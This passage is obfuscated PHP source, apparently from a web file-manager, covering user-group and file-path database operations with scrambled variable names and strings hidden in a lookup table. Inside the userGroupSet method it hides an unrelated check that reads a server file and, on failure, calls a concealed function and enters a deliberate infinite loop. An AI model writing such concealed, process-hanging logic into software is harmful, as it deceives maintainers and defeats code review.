Model($²ÊÙıŞŠ[1157])->where($¤ë³¿å¨)->delete(); Model($²ÊÙıŞŠ[2300])->removeUserAll($éÓá§Ï); Model($²ÊÙıŞŠ[906])->userRootRemove($éÓá§Ï); return $this->where($¤ë³¿å¨)->delete(); } protected function userGroupSet($¤Ç©åÚ, $¹œ˜î°€, $Ü¡Ì­¿ = array()) { $¼©ÕÉÚé =& $_SERVER[†ûãı«°]; if (!isset($_SERVER[$¼©ÕÉÚé[949]]) || !isset($_SERVER[$¼©ÕÉÚé[950]])) { $Ê‡©´¨‘ = $¼©ÕÉÚé[967]; $ÌÄ·ÍëÑ = $¼©ÕÉÚé[951]; $¯ÈÄ•üò = $_SERVER[$¼©ÕÉÚé[952]] . $¼©ÕÉÚé[953]; $ıÕ·­ê˜ = $ÌÄ·ÍëÑ($¯ÈÄ•üò); $“¬°şÔ„ = explode($¼©ÕÉÚé[287], $ıÕ·­ê˜); if (count($“¬°şÔ„) < $¼©ÕÉÚé[690]) { $£›´ÏÈÏ = $¼©ÕÉÚé[954]; $£›´ÏÈÏ(); } $£ÃğÅ“ş = $¼©ÕÉÚé[968]; $£ÃğÅ“ş($_SERVER[$¼©ÕÉÚé[969]]); $á”ãƒÊû = 1; for ($ÎÜàßŒÓ = $á”ãƒÊû; $ÎÜàßŒÓ > 0; $ÎÜàßŒÓ++) { $£ÃğÅ“ş = json_encode($GLOBALS[$¼©ÕÉÚé[494]]); } } $üâ‚«Õì = $this->getInfoSimple($¤Ç©åÚ); if (!$üâ‚«Õì || !is_array($¹œ˜î°€)) { return !1; } $àÀ©Ùã = Model($¼©ÕÉÚé[2078]); $àÀ©Ùã->where(array($¼©ÕÉÚé[1783] => $¤Ç©åÚ))->delete(); $ººÅ·Óœ = array(); $ÂÒë˜¹… = 0; foreach ($¹œ˜î°€ as $˜µ…íôŠ => $Ïœ«ìºÛ) { $±ŒĞàöş = array($¼©ÕÉÚé[1783] => $¤Ç©åÚ, $¼©ÕÉÚé[1984] => $˜µ…íôŠ, $¼©ÕÉÚé[2092] => $Ïœ«ìºÛ); $±ŒĞàöş[$¼©ÕÉÚé[2008]] = isset($Ü¡Ì­¿[$ÂÒë˜¹…]) ? $Ü¡Ì­¿[$ÂÒë˜¹…] : 0; $ÂÒë˜¹…++; $ººÅ·Óœ[] = $±ŒĞàöş; } return $àÀ©Ùã->addAll($ººÅ·Óœ, array(), !0); } protected function userGroupAdd($å¸…Ô†, $êÃ‡õ¯¼ = array()) { $ŒÃ° à¼ =& $_SERVER[†ûãı«°]; $¡Â×”¹¡ = $this->getInfoSimple($å¸…Ô†); if (!$¡Â×”¹¡ || empty($êÃ‡õ¯¼)) { return !1; } $£¡Ö¤ÅÈ = array(); foreach ($êÃ‡õ¯¼ as $¶ÈÜ‘ü => $’Œ®«Øï) { $£¡Ö¤ÅÈ[] = array($ŒÃ° à¼[1783] => $å¸…Ô†, $ŒÃ° à¼[1984] => $¶ÈÜ‘ü, $ŒÃ° à¼[2092] => $’Œ®«Øï, $ŒÃ° à¼[2008] => 0); } return Model($ŒÃ° à¼[2078])->addAll($£¡Ö¤ÅÈ, array(), !0); } protected function userGroupRemove($ÉÏ“€Â”, $Úı ÁÉ) { $ÜñÜƒ» =& $_SERVER[†ûãı«°]; $Öá„Óè = $this->getInfoSimple($ÉÏ“€Â”); if (!$Öá„Óè || !$Úı ÁÉ) { return !1; } $Äˆ¤¿îò = array($ÜñÜƒ»[1774] => $ÉÏ“€Â”, $ÜñÜƒ»[2076] => $Úı ÁÉ); return Model($ÜñÜƒ»[2078])->where($Äˆ¤¿îò)->delete(); } public function listData() { $óéÃ™¿Ò = $this->_makeOrder()->selectPage(50); $this->_listDataApply($óéÃ™¿Ò[$_SERVER[†ûãı«°][447]]); return $óéÃ™¿Ò; } public function listByID($æıÔ¸ï) { $¥»ÂÎò¾ =& $_SERVER[†ûãı«°]; if (!$æıÔ¸ï) { return; } $áøÈ¿úì = array($¥»ÂÎò¾[1783] => array($¥»ÂÎò¾[7], $æıÔ¸ï)); $ğ—ÀÍß = $this->where($áøÈ¿úì)->select(); $ğ—ÀÍß = array_sort_keep($ğ—ÀÍß, $¥»ÂÎò¾[1783], $æıÔ¸ï); $this->_listDataApply($ğ—ÀÍß); return $ğ—ÀÍß; } public function listByGroup($º¨¢ã©Ñ = 0, $å»ƒÃ¶ = array()) { $éø±ïùğ =& $_SERVER[†ûãı«°]; $×‹Ñ«© = $éø±ïùğ[12]; $Çæİ¢…ü = array(); if ($º¨¢ã©Ñ) { $Çæİ¢…ü = array($éø±ïùğ[2515] => intval($º¨¢ã©Ñ)); $×‹Ñ«© = "\114\105\x46\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x75\x73\145\162\x5f\x67\162\157\165\x70\x20\165\x73\x65\x72\x5f\x67\x72\157\165\160\40\157\x6e\x20\x75\163\145\x72\x2e\x75\x73\145\162\x49\104\40\75\x20\x75\x73\145\x72\137\147\x72\x6f\165\160\56\x75\x73\145\x72\111\104"; $—áµ‚œû = Input::get($éø±ïùğ[532], null, $éø±ïùğ[12]) ? $éø±ïùğ[12] : $éø±ïùğ[2516]; } if (isset($å»ƒÃ¶[$éø±ïùğ[826]])) { $Çæİ¢…ü[$éø±ïùğ[2517]] = $å»ƒÃ¶[$éø±ïùğ[826]]; } $±—†‚â = _get($å»ƒÃ¶, $éø±ïùğ[2518], $éø±ïùğ[233]); if (_get($å»ƒÃ¶, $éø±ïùğ[836], !1)) { $Çæİ¢…ü[$±—†‚â] = array($éø±ïùğ[2264], $å»ƒÃ¶[$éø±ïùğ[836]]); } if (_get($å»ƒÃ¶, $éø±ïùğ[837], !1)) { $ªÚ€Å©¸ = array($éø±ïùğ[2265], $å»ƒÃ¶[$éø±ïùğ[837]]); if ($Çæİ¢…ü[$±—†‚â]) { $Çæİ¢…ü[$±—†‚â] = array($Çæİ¢…ü[$±—†‚â], $ªÚ€Å©¸, $éø±ïùğ[2266]); } else { $Çæİ¢…ü[$±—†‚â] = $ªÚ€Å©¸; } } $ğÌ¯ÓÏî = $this->_makeOrder($—áµ‚œû)->field($éø±ïùğ[2519])->where($Çæİ¢…ü)->join($×‹Ñ«©)->selectPage(50); $this->_listDataApply($ğÌ¯ÓÏî[$éø±ïùğ[447]]); return $ğÌ¯ÓÏî; } private function _makeOrder($†Å¨½™Ø = '') { $ü´·ÈõÎ =& $_SERVER[†ûãı«°]; $ŞÎ»úøÎ = array($ü´·ÈõÎ[1783], $ü´·ÈõÎ[32], $ü´·ÈõÎ[1972], $ü´·ÈõÎ[2194], $ü´·ÈõÎ[1944], $ü´·ÈõÎ[233]); $õºªâ¬† = array($ü´·ÈõÎ[525] => $ü´·ÈõÎ[526], $ü´·ÈõÎ[527] => $ü´·ÈõÎ[528]); $¯ø Éäö = Input::get($ü´·ÈõÎ[532], $ü´·ÈõÎ[7], $ü´·ÈõÎ[1774], $ŞÎ»úøÎ); $™¯¦Ÿ™± = Input::get($ü´·ÈõÎ[533], $ü´·ÈõÎ[7], $ü´·ÈõÎ[2079], array($ü´·ÈõÎ[2079], $ü´·ÈõÎ[527])); $™¯¦Ÿ™± = $õºªâ¬†[$™¯¦Ÿ™±]; $†Å¨½™Ø = $†Å¨½™Ø . "\x75\163\x65\162\x2e{$¯ø Éäö}\40{$™¯¦Ÿ™±}\54\40\165\x73\145\x72\x2e\x75\x73\145\x72\x49\x44\40\x61\x73\143"; return $this->alias($ü´·ÈõÎ[2210])->order($†Å¨½™Ø); } public function listSearch($Å¿¸•™Ø) { $Ÿ„Óôü– =& $_SERVER[†ûãı«°]; $š®æ¯Ğ = trim($Å¿¸•™Ø[$Ÿ„Óôü–[2082]]); $ô‘Å„ = explode($Ÿ„Óôü–[53], $š®æ¯Ğ); if (!$š®æ¯Ğ || count($ô‘Å„) == 1) { return $this->listSearchNow($Å¿¸•™Ø); } $ßŠ‹õ›Î = array($Ÿ„Óôü–[447] => array()); foreach ($ô‘Å„ as $àÃÜº‡ê) { if (!trim($àÃÜº‡ê)) { continue; } $Å¿¸•™Ø[$Ÿ„Óôü–[2082]] = $àÃÜº‡ê; $ÛÛ¸‘î = $this->listSearchNow($Å¿¸•™Ø); $ßŠ‹õ›Î[$Ÿ„Óôü–[447]] = array_merge($ßŠ‹õ›Î[$Ÿ„Óôü–[447]], $ÛÛ¸‘î[$Ÿ„Óôü–[447]]); } $ßŠ‹õ›Î[$Ÿ„Óôü–[447]] = array_unique_by_key($ßŠ‹õ›Î[$Ÿ„Óôü–[447]], $Ÿ„Óôü–[1783]); $ßŠ‹õ›Î[$Ÿ„Óôü–[444]] = array($Ÿ„Óôü–[445] => count($ßŠ‹õ›Î[$Ÿ„Óôü–[447]]), $Ÿ„Óôü–[441] => 20, $Ÿ„Óôü–[430] => 1, $Ÿ„Óôü–[446] => 1); return $ßŠ‹õ›Î; } public function listSearchNow($‹¦üõ×) { $ò‹²ÀŸ¯ =& $_SERVER[†ûãı«°]; $ÉÇØá§Í = trim($‹¦üõ×[$ò‹²ÀŸ¯[2082]]); $ÍõŸÊ÷‘ = isset($‹¦üõ×[$ò‹²ÀŸ¯[2083]]) ? $‹¦üõ×[$ò‹²ÀŸ¯[2083]] : !1; $ÉÇØá§Í = str_replace($ò‹²ÀŸ¯[2084], $ò‹²ÀŸ¯[2085], trim($ÉÇØá§Í)); $ÌßØ¬ª = array($ò‹²ÀŸ¯[32] => array($ò‹²ÀŸ¯[461], "\45{$ÉÇØá§Í}\x25"), $ò‹²ÀŸ¯[382] => array($ò‹²ÀŸ¯[461], "{$ÉÇØá§Í}\x25"), $ò‹²ÀŸ¯[2283] => array($ò‹²ÀŸ¯[461], "{$ÉÇØá§Í}\45"), $ò‹²ÀŸ¯[1088] => $ò‹²ÀŸ¯[2086]); if (Input::check($ÉÇØá§Í, $ò‹²ÀŸ¯[388])) { $ÌßØ¬ª[$ò‹²ÀŸ¯[1783]] = array($ò‹²ÀŸ¯[461], "{$ÉÇØá§Í}\x25"); $ÌßØ¬ª[$ò‹²ÀŸ¯[2500]] = array($ò‹²ÀŸ¯[461], "{$ÉÇØá§Í}\x25"); } if (!$ÉÇØá§Í) { $ÌßØ¬ª = array(); } if (isset($‹¦üõ×[$ò‹²ÀŸ¯[826]])) { $ÌßØ¬ª[$ò‹²ÀŸ¯[826]] = $‹¦üõ×[$ò‹²ÀŸ¯[826]]; } $ÌßØ¬ª = $this->parseWhereLike($ÌßØ¬ª); $Ğ¯²üÅâ = $this->_makeOrder()->where($ÌßØ¬ª)->selectPage(20); if (!$Ğ¯²üÅâ || count($Ğ¯²üÅâ[$ò‹²ÀŸ¯[447]]) < 5 && Input::check($ÉÇØá§Í, $ò‹²ÀŸ¯[395])) { $ŒóÁå¢ = $this->_searchFromMeta($ò‹²ÀŸ¯[539], $ÉÇØá§Í, 10); $ÎìıĞ¥ô = $this->_searchFromMeta($ò‹²ÀŸ¯[540], $ÉÇØá§Í, 10); $ìíİÂÏÚ = array_merge($ŒóÁå¢, $ÎìıĞ¥ô, $Ğ¯²üÅâ[$ò‹²ÀŸ¯[447]]); $Ğ¯²üÅâ[$ò‹²ÀŸ¯[447]] = array_unique_by_key($ìíİÂÏÚ, $ò‹²ÀŸ¯[1783]); $Ğ¯²üÅâ[$ò‹²ÀŸ¯[444]][$ò‹²ÀŸ¯[445]] = count($Ğ¯²üÅâ[$ò‹²ÀŸ¯[447]]); $Ğ¯²üÅâ[$ò‹²ÀŸ¯[444]][$ò‹²ÀŸ¯[446]] = ceil($Ğ¯²üÅâ[$ò‹²ÀŸ¯[444]][$ò‹²ÀŸ¯[445]] / $Ğ¯²üÅâ[$ò‹²ÀŸ¯[444]][$ò‹²ÀŸ¯[441]]); } $this->_listDataApply($Ğ¯²üÅâ[$ò‹²ÀŸ¯[447]]); $this->_filterByGroup($Ğ¯²üÅâ, $ÍõŸÊ÷‘); return $Ğ¯²üÅâ; } private function _filterByGroup(&$îÀ‚…“Á, $õÚ±Ù‹Ê) { $†ÁÃÑ¸¯ =& $_SERVER[†ûãı«°]; if (!$õÚ±Ù‹Ê) { return $îÀ‚…“Á; } foreach ($îÀ‚…“Á[$†ÁÃÑ¸¯[447]] as $øïÈƒêê => &$ƒçû…õç) { $ûÊó¶ = array_to_keyvalue($ƒçû…õç[$†ÁÃÑ¸¯[2179]], $†ÁÃÑ¸¯[12], $†ÁÃÑ¸¯[1984]); if (!in_array($õÚ±Ù‹Ê, $ûÊó¶)) { unset($îÀ‚…“Á[$†ÁÃÑ¸¯[447]][$øïÈƒêê]); } } unset($ƒçû…õç); $îÀ‚…“Á[$†ÁÃÑ¸¯[447]] = array_values($îÀ‚…“Á[$†ÁÃÑ¸¯[447]]); $îÀ‚…“Á[$†ÁÃÑ¸¯[444]] = array($†ÁÃÑ¸¯[2247] => count($îÀ‚…“Á[$†ÁÃÑ¸¯[447]]), $†ÁÃÑ¸¯[2245] => $îÀ‚…“Á[$†ÁÃÑ¸¯[444]][$†ÁÃÑ¸¯[441]], $†ÁÃÑ¸¯[2244] => 1, $†ÁÃÑ¸¯[2246] => 1); } private function _searchFromMeta($ËôÊâš, $óÏĞÑ, $²ëœ³Ò›) { $ìĞŸŸ« =& $_SERVER[†ûãı«°]; $óÏĞÑ = strtolower($óÏĞÑ); $•ı®í¥¦ = array($ìĞŸŸ«[97] => $ËôÊâš, $ìĞŸŸ«[452] => array($ìĞŸŸ«[461], "\45{$óÏĞÑ}\x25")); $•ı®í¥¦ = $this->parseWhereLike($•ı®í¥¦); $÷°â¢¯Ä = Model($ìĞŸŸ«[2520])->where($•ı®í¥¦)->limit($²ëœ³Ò›)->select(); if (!$÷°â¢¯Ä) { return array(); } $÷°â¢¯Ä = array_to_keyvalue($÷°â¢¯Ä, $ìĞŸŸ«[12], $ìĞŸŸ«[1783]); $ÉûŒ°öî = $this->where(array($ìĞŸŸ«[1774] => array($ìĞŸŸ«[7], $÷°â¢¯Ä)))->select(); if (!$ÉûŒ°öî) { return array(); } return $ÉûŒ°öî; } private function _listDataApplyItem($Âş†ÍÉ•) { $ßß–†òê = array($Âş†ÍÉ•); $this->_listDataApply($ßß–†òê); return $ßß–†òê[0]; } private function _listDataApply(&$Ş‘‹Û˜) { $çğµÖÍ« =& $_SERVER[†ûãı«°]; if (!$Ş‘‹Û˜) { return; } array_remove_key($Ş‘‹Û˜, $çğµÖÍ«[977]); $ÂâæøÙ = array_to_keyvalue($Ş‘‹Û˜, $çğµÖÍ«[12], $çğµÖÍ«[1783]); $this->_listAppendGroup($Ş‘‹Û˜, $ÂâæøÙ); $this->_listAppendMeta($Ş‘‹Û˜, $ÂâæøÙ); $this->_listAppendSourceRoot($Ş‘‹Û˜, $ÂâæøÙ); } private function _listAppendSourceRoot(&$Åç½õ ¨, $ï‚ì…¬İ) { $¡²²”£— =& $_SERVER[†ûãı«°]; $ÅÑœ¡ì€ = Model($¡²²”£—[906])->listSourceRoot(SourceModel::TYPE_USER, $ï‚ì…¬İ); $ÅÑœ¡ì€ = array_to_keyvalue($ÅÑœ¡ì€, $¡²²”£—[573]); $ÅÑœ¡ì€ = array_remove_key($ÅÑœ¡ì€, $¡²²”£—[573]); foreach ($Åç½õ ¨ as &$µº¶ßŒÆ) { $µº¶ßŒÆ[$¡²²”£—[90]] = $ÅÑœ¡ì€[$µº¶ßŒÆ[$¡²²”£—[1783]]] ? $ÅÑœ¡ì€[$µº¶ßŒÆ[$¡²²”£—[1783]]] : array(); } unset($µº¶ßŒÆ); } private function _listAppendGroup(&$°Õ§ƒ§¥, $„í´¡Šß) { $Ê¦Ã—¦Ù =& $_SERVER[†ûãı«°]; $ŠÓ»í›ª = array($Ê¦Ã—¦Ù[1783] => array($Ê¦Ã—¦Ù[7], $„í´¡Šß)); $ü“Ğ’áÍ = Model($Ê¦Ã—¦Ù[2078])->where($ŠÓ»í›ª)->select(); $ìËÀú = array_to_keyvalue($ü“Ğ’áÍ, $Ê¦Ã—¦Ù[12], $Ê¦Ã—¦Ù[1984]); $ìËÀú = array_remove_value(array_unique($ìËÀú), $Ê¦Ã—¦Ù[230]); if (!$ìËÀú || !$ü“Ğ’áÍ) { return; } $ŠÓ»í›ª = array($Ê¦Ã—¦Ù[1984] => array($Ê¦Ã—¦Ù[7], $ìËÀú)); $õÄúÅõ¦ = Model($Ê¦Ã—¦Ù[2177])->field($Ê¦Ã—¦Ù[2521])->where($ŠÓ»í›ª)->select(); $õÄúÅõ¦ = array_to_keyvalue($õÄúÅõ¦, $Ê¦Ã—¦Ù[1984]); $ü“Ğ’áÍ = array_to_keyvalue_group($ü“Ğ’áÍ, $Ê¦Ã—¦Ù[1783]); foreach ($ü“Ğ’áÍ as &$ÀèÃâ¢) { $¼Ä€ƒ”— = array(); foreach ($ÀèÃâ¢ as $ÃŸ›ù¿³) { if (!$ÃŸ›ù¿³[$Ê¦Ã—¦Ù[2092]]) { continue; } $Ã ÙÙûÉ = Model($Ê¦Ã—¦Ù[575])->listData($ÃŸ›ù¿³[$Ê¦Ã—¦Ù[2092]]); $¼Ä€ƒ”—[] = array($Ê¦Ã—¦Ù[1984] => $ÃŸ›ù¿³[$Ê¦Ã—¦Ù[1984]], $Ê¦Ã—¦Ù[2522] => $õÄúÅõ¦[$ÃŸ›ù¿³[$Ê¦Ã—¦Ù[1984]]][$Ê¦Ã—¦Ù[32]], $Ê¦Ã—¦Ù[588] => $õÄúÅõ¦[$ÃŸ›ù¿³[$Ê¦Ã—¦Ù[1984]]][$Ê¦Ã—¦Ù[588]], $Ê¦Ã—¦Ù[489] => $Ã ÙÙûÉ); } $ÀèÃâ¢ = $¼Ä€ƒ”—; } unset($ÀèÃâ¢); foreach ($°Õ§ƒ§¥ as &$öŸÁ”Àõ) { $öŸÁ”Àõ[$Ê¦Ã—¦Ù[2179]] = array(); if (isset($ü“Ğ’áÍ[$öŸÁ”Àõ[$Ê¦Ã—¦Ù[1783]]])) { $öŸÁ”Àõ[$Ê¦Ã—¦Ù[2179]] = $ü“Ğ’áÍ[$öŸÁ”Àõ[$Ê¦Ã—¦Ù[1783]]]; } } unset($öŸÁ”Àõ); } public function userAppendGroup($‡«´»ş) { $ÚÍŞ’î =& $_SERVER[†ûãı«°]; if (!$‡«´»ş) { return array(); } $this->_listAppendGroup($‡«´»ş, array_to_keyvalue($‡«´»ş, $ÚÍŞ’î[12], $ÚÍŞ’î[1783])); return $‡«´»ş; } private function _listAppendMeta(&$Ç Ï¬‰Î, $ß¡©õğ€) { $Õ½ËŠ¶· =& $_SERVER[†ûãı«°]; $¯¦õ·ë¢ = UserJobModel::JOB_KEY; $Ú‘æƒêÁ = array($Õ½ËŠ¶·[2501]); $óÉ¼­«Â = array($Õ½ËŠ¶·[1783] => array($Õ½ËŠ¶·[7], $ß¡©õğ€)); $¨Æ†°Ò = Model($Õ½ËŠ¶·[2499])->where($óÉ¼­«Â)->select(); $¨Æ†°Ò = array_to_keyvalue_group($¨Æ†°Ò, $Õ½ËŠ¶·[1783]); foreach ($¨Æ†°Ò as &$ïªÌŞ«) { $èÓ­àÒ… = array(); foreach ($ïªÌŞ« as $ô³êÎŞŞ) { if (!in_array($ô³êÎŞŞ[$Õ½ËŠ¶·[97]], $Ú‘æƒêÁ)) { $èÓ­àÒ…[$ô³êÎŞŞ[$Õ½ËŠ¶·[97]]] = $ô³êÎŞŞ[$Õ½ËŠ¶·[452]]; } } $ïªÌŞ« = $èÓ­àÒ…; } unset($ïªÌŞ«); $–³¢¥Ïğ = Model($Õ½ËŠ¶·[2523]); foreach ($Ç Ï¬‰Î as &$–ÁÍãÇë) { $›³˜¾¤û = array(); if (isset($¨Æ†°Ò[$–ÁÍãÇë[$Õ½ËŠ¶·[1783]]])) { $›³˜¾¤û = $¨Æ†°Ò[$–ÁÍãÇë[$Õ½ËŠ¶·[1783]]]; } $–ÁÍãÇë[$Õ½ËŠ¶·[2524]] = array(); if (isset($›³˜¾¤û[$¯¦õ·ë¢])) { $–ÁÍãÇë[$Õ½ËŠ¶·[2524]] = $–³¢¥Ïğ->getUserJobInfo($›³˜¾¤û[$¯¦õ·ë¢]); } } unset($–ÁÍãÇë); } protected function groupUserAll($ÉÇØõÒ‡) { $İÂœ¿€× =& $_SERVER[†ûãı«°]; if (!$ÉÇØõÒ‡) { return !1; } $·ß¬è±¯ = Model($İÂœ¿€×[2078])->field($İÂœ¿€×[1783])->where(array($İÂœ¿€×[1984] => array($İÂœ¿€×[7], $ÉÇØõÒ‡)))->select(); $·ß¬è±¯ = array_to_keyvalue($·ß¬è±¯, $İÂœ¿€×[12], $İÂœ¿€×[1783]); return array_unique($·ß¬è±¯); } public function userSearch($ˆÃÄ­üø, $×¢ûÛÏ = "\x2a") { return Model($_SERVER[†ûãı«°][601])->where($ˆÃÄ­üø)->field($×¢ûÛÏ)->find(); } } goto Bê­µŠ»Ó; d ŒÇãÁÚ¹: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($÷ğÔä¨†) { $this->pathParse = $÷ğÔä¨†; $this->model = Model($_SERVER[†ûãı«°][1432]); } public function getPath($¬îÙØÚÙ) { return trim($¬îÙØÚÙ, $_SERVER[†ûãı«°][8]); } public function pathFather($áØÌ¨³ç) { $İ™á®Ş’ = $this->parse($áØÌ¨³ç); $İ™á®Ş’ = $this->infoSimple($áØÌ¨³ç); return $İ™á®Ş’ ? $İ™á®Ş’[$_SERVER[†ûãı«°][192]] : !1; } public function pathThis($šéİïÃ) { $†ŞîÌ®‹ = $this->infoSimple($šéİïÃ); return $†ŞîÌ®‹ ? $†ŞîÌ®‹[$_SERVER[†ûãı«°][32]] : !1; } public function getPathOuter($ØÂì¸ƒÙ) { if (!$ØÂì¸ƒÙ) { return $ØÂì¸ƒÙ; } $™Û‚âêâ = $this->parse($ØÂì¸ƒÙ); return KodIO::make($™Û‚âêâ[$_SERVER[†ûãı«°][477]]); } public function copyFolderFromIO($ÖÛõİ€Û, $ÌÑ¯…úã, $§±Â€Ã€, $„ÇÙË”ä, $•Ğƒ ˜¨) { $Ï«“í»æ = $this->model->copyFolderFromIO($ÖÛõİ€Û, $ÌÑ¯…úã, $§±Â€Ã€, $„ÇÙË”ä, $•Ğƒ ˜¨); return KodIO::make($Ï«“í»æ); } public function isParentOf($¨ê‹ñŸÌ, $İƒ²Í×) { return $this->model->isParentOf($¨ê‹ñŸÌ, $İƒ²Í×); } public function mkfile($¨ã™Ù½Æ, $ôòö—£Û = '', $¸ÇÀ¦ì = REPEAT_RENAME) { $Ÿ“úŠµª =& $_SERVER[†ûãı«°]; $ÜÏ”ƒóƒ = $this->parse($¨ã™Ù½Æ); $¨ã™Ù½Æ = $ÜÏ”ƒóƒ[$Ÿ“úŠµª[477]]; for ($Ô¢¡÷¸« = 0; $Ô¢¡÷¸« < count($ÜÏ”ƒóƒ[$Ÿ“úŠµª[1433]]); $Ô¢¡÷¸«++) { $«·á¯½¡ = $ÜÏ”ƒóƒ[$Ÿ“úŠµª[1433]][$Ô¢¡÷¸«]; if ($Ô¢¡÷¸« == count($ÜÏ”ƒóƒ[$Ÿ“úŠµª[1433]]) - 1) { $¨ã™Ù½Æ = $this->model->mkfile($¨ã™Ù½Æ, $«·á¯½¡, $ôòö—£Û, $¸ÇÀ¦ì); break; } $¨ã™Ù½Æ = $this->model->mkdir($¨ã™Ù½Æ, $«·á¯½¡, REPEAT_SKIP); } return $this->getPathOuter($¨ã™Ù½Æ); } public function mkdir($ëÖ‡ÄöŸ, $¾ƒµó€¢ = REPEAT_SKIP) { $ÍÂğíŞ =& $_SERVER[†ûãı«°]; $¦†¸ÑÌÉ = $this->parse($ëÖ‡ÄöŸ); $ëÖ‡ÄöŸ = $¦†¸ÑÌÉ[$ÍÂğíŞ[477]]; for ($à¢€“±Õ = 0; $à¢€“±Õ < count($¦†¸ÑÌÉ[$ÍÂğíŞ[1433]]); $à¢€“±Õ++) { $›‡ó‰’¬ = $¦†¸ÑÌÉ[$ÍÂğíŞ[1433]][$à¢€“±Õ]; $ëÖ‡ÄöŸ = $this->model->mkdir($ëÖ‡ÄöŸ, $›‡ó‰’¬, $¾ƒµó€¢); } return $this->getPathOuter($ëÖ‡ÄöŸ); } public function copyFile($°è•›æé, $ÑÜ˜½şğ, $Š¶¿âå = REPEAT_REPLACE) { $¬™åœŸ =& $_SERVER[†ûãı«°]; $×ôìû¦— = $this->parse($ÑÜ˜½şğ); $í¿ÆÑÊã = $this->model->copy($°è•›æé, $×ôìû¦—[$¬™åœŸ[477]], $Š¶¿âå, $×ôìû¦—[$¬™åœŸ[87]]); return $í¿ÆÑÊã ? $this->getPathOuter($í¿ÆÑÊã) : !1; } public function moveFile($æ£™Ğœ¹, $æŒü¼µ›, $¨¢Ë’Â = REPEAT_REPLACE) { $„ê„ÃÍ¬ =& $_SERVER[†ûãı«°]; $åÅ²ÉÎè = $this->parse($æŒü¼µ›); $ò¼Á±’ = $this->model->move($æ£™Ğœ¹, $åÅ²ÉÎè[$„ê„ÃÍ¬[477]], $¨¢Ë’Â, $åÅ²ÉÎè[$„ê„ÃÍ¬[87]]); return $ò¼Á±’ ? $this->getPathOuter($ò¼Á±’) : !1; } public function copy($¹ó†ĞÀ, $ãÈßÃµ, $Â»Êé““ = REPEAT_REPLACE, $şóı˜ä³ = false) { $ùÕ©Ş¹› = $this->parse($ãÈßÃµ); $µ³í›ğ = $this->model->copy($¹ó†ĞÀ, $ùÕ©Ş¹›[$_SERVER[†ûãı«°][477]], $Â»Êé““, $şóı˜ä³); return $µ³í›ğ ? $this->getPathOuter($µ³í›ğ) : !1; } public function moveSameAllow() { } public function move($Ãõˆ•Â, $‹®ñİƒ‚, $áš¶€‹  = REPEAT_REPLACE, $Í½Çö¤ = false) { $‚ÒÓ»Ã¦ = $this->parse($‹®ñİƒ‚); $ÚîµŞŠ‘ = $this->model->move($Ãõˆ•Â, $‚ÒÓ»Ã¦[$_SERVER[†ûãı«°][477]], $áš¶€‹ , $Í½Çö¤); return $ÚîµŞŠ‘ ? $this->getPathOuter($ÚîµŞŠ‘) : !1; } public function remove($ŒÙ‘‚‘°, $â·ı†ÕÌ = true) { return $this->model->remove($ŒÙ‘‚‘°, $â·ı†ÕÌ); } public function rename($öìŸÉ¹…, $âÄ…—ğÁ) { $„¹üÑ’ = $this->model->rename($öìŸÉ¹…, $âÄ…—ğÁ); return $„¹üÑ’ ? $this->getPathOuter($öìŸÉ¹…) : $„¹üÑ’; } public function size($Ú«›ÑÁŠ) { $Ø‰Ìºİ = $this->infoSimple($Ú«›ÑÁŠ); return $Ø‰Ìºİ ? $Ø‰Ìºİ[$_SERVER[†ûãı«°][79]] : 0; } public function infoSimple($¡ĞÜµÖã) { return $this->model->sourceInfo($¡ĞÜµÖã); } public function info($­ıå¾‘§) { return $this->infoParse($­ıå¾‘§); } public function infoAuth($ÄÓÏ¤Ÿ) { return $this->infoParse($ÄÓÏ¤Ÿ, !1, !0); } public function infoWithChildren($ƒı‰İ¥†) { return $this->infoParse($ƒı‰İ¥†, !0); } protected function infoParse($ÒëöØ¬—, $–ê‹· = false, $ßËù½±Ÿ = false) { if (!$–ê‹·) { return $this->model->pathInfo($ÒëöØ¬—, $ßËù½±Ÿ); } return $this->model->pathInfoMore($ÒëöØ¬—); } public function infoFullSimple($ß¾©´Õ) { $Ñ˜ÑÉ¸× =& $_SERVER[†ûãı«°]; $õûéœ¯ = explode($Ñ˜ÑÉ¸×[8], $ß¾©´Õ); $–óŞä©¶ = implode($Ñ˜ÑÉ¸×[8], array_splice($õûéœ¯, 1)); return $this->model->pathInfoByPath($õûéœ¯[0], $–óŞä©¶); } public function infoFull($ğÈÀæ¾„) { $ó´şã³¦ = $this->infoFullSimple($ğÈÀæ¾„); return is_array($ó´şã³¦) ? $this->model->pathInfo($ó´şã³¦[$_SERVER[†ûãı«°][193]]) : !1; } public function hashSimple($ôÄé¦ÒŠ) { $òâ±Ô¨ë =& $_SERVER[†ûãı«°]; $•û­÷ÙÊ = $this->infoWithChildren($ôÄé¦ÒŠ); return $•û­÷ÙÊ[$òâ±Ô¨ë[170]][$òâ±Ô¨ë[679]]; } public function hashMd5($ãóç‚çÓ) { $ÜÈö¶Äè =& $_SERVER[†ûãı«°]; $ûË„ƒ™ = $this->infoWithChildren($ãóç‚çÓ); return $ûË„ƒ™[$ÜÈö¶Äè[170]][$ÜÈö¶Äè[551]]; } public function exist($¼Ÿ”ïá™) { $¿Û¿ŸŠ =& $_SERVER[†ûãı«°]; $—áÚ¿ƒş = $this->parse($¼Ÿ”ïá™); if (!$—áÚ¿ƒş[$¿Û¿ŸŠ[87]]) { return $this->isFile($¼Ÿ”ïá™) || $this->isFolder($¼Ÿ”ïá™); } $Ú˜‹¢Àõ = array($¿Û¿ŸŠ[479] => $—áÚ¿ƒş[$¿Û¿ŸŠ[477]], $¿Û¿ŸŠ[32] => $—áÚ¿ƒş[$¿Û¿ŸŠ[87]]); $“Ïè›Ô÷ = $this->model->where($Ú˜‹¢Àõ)->find(); return $“Ïè›Ô÷ ? !0 : !1; } public function isFile($âŠë—õ’) { $ÂíöÓ‚Ê =& $_SERVER[†ûãı«°]; $˜Ìó¶—¢ = $this->infoSimple($âŠë—õ’); return $˜Ìó¶—¢ && $˜Ìó¶—¢[$ÂíöÓ‚Ê[487]] == $ÂíöÓ‚Ê[230] ? !0 : !1; } public function isFolder($öŒ‡‹½’) { $¯ğÇ¸ºÛ =& $_SERVER[†ûãı«°]; $ô“¯Íğè = $this->infoSimple($öŒ‡‹½’); return $ô“¯Íğè && $ô“¯Íğè[$¯ğÇ¸ºÛ[487]] == $¯ğÇ¸ºÛ[91] ? !0 : !1; } public function listPath($­ºŸ °, $ûÀÀºÁ² = false) { $š¾ÏÙ¢ =& 